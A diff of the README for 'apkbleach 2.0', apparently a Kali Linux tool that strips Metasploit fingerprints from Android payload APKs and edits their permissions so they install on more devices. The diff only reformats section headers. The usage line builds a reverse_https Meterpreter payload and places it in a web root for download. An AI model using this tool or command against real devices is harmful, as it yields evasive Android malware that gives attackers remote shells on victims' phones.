@@ -1,11 +1,11 @@
 # apkbleach_2.0
 The newest release of apkbleach
 
-About:
+**About:
 
 This software was developed specifically for Kali-Linux to remove the obvious fingerprints of metasploit through out a android PAYLOAD along with assisting the user in making PAYLOAD.apk more installable across a wider range of devices.
 
-Features:
+**Features:
 
 1) Line by line permissions editing. The software will go through each permission in the manifest and ask if you want to delete it.
 
@@ -25,7 +25,7 @@ Features:
 
 9) Apktool upgrade feature. If the software detects youre using apktool version 2.4.1-dirty which is Kali's package maintainers version it will ask if you want to replace it with the lates version frfom ibot peaches. This is a good idea because it conflicts with the msfvenom -x option and throws a version number error. Not to mention the problems it has given users in the past.
 
-Usage:
+**Usage:
 
 apkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 3 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk
 
